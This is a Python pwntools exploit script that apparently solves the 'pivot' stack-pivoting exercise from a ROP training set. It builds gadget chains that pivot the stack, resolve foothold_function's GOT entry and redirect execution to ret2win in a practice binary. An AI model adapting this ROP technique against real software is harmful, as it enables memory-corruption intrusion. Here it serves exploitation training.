from pwn import *
import pdb

pivot = ELF("./pivot")
libpivot = ELF("./libpivot.so")

gadgets_base = pivot.symbols["usefulGadgets"]
foothold_function = pivot.symbols["plt.foothold_function"] # foothold_function@plt
offset_ret2win = libpivot.symbols["ret2win"]
offset_foothold = libpivot.symbols["foothold_function"]

ret2win_function_offset = offset_ret2win - offset_foothold
foothold_function_got_plt = pivot.symbols["got.foothold_function"]



# gadgets
pop_rax = gadgets_base + 0 # pop rax; ret
xchg_esp_rax = gadgets_base + 2 # xchg esp,rax; ret
mov_rax_ptrrax = gadgets_base + 5  # mov rax, QWORD PTR [rax]; ret
add_rax_rbp = gadgets_base + 9 # add rax,rbp; ret
pop_rbp = pivot.symbols["deregister_tm_clones"] + 48 # pop rbp; ret
call_rax = pivot.symbols["frame_dummy"] + 30 # call rax

begin_payload = 0x7ffff7809f10 # this is where our payload will be stored at


# step 0: stack pivot chain

stackpivotchain = ""
stackpivotchain += p64(pop_rax)
stackpivotchain += p64(begin_payload)
stackpivotchain += p64(xchg_esp_rax)

# step 1: call foothold_function

ropchain = ""
ropchain += p64(foothold_function)

# step 2: overwrite foothold function

ropchain += p64(pop_rax)
ropchain += p64(foothold_function_got_plt) # rax holds now the address of the foothold_function got plt entry
ropchain += p64(mov_rax_ptrrax) # rax contains now the contents of the foothold_function got plt entry
ropchain += p64(pop_rbp) # rbp contains now the offset to the ret2win function
ropchain += p64(ret2win_function_offset)
ropchain += p64(add_rax_rbp) # rax contains now the final address to the ret2win function
ropchain += p64(call_rax) # call ret2win


payload = ropchain
payload += (295 - len(ropchain)) *"B" # filler bytes to reach the point of RIP control
payload += stackpivotchain






io = pivot.process()

io.sendline(payload)

io.interactive()
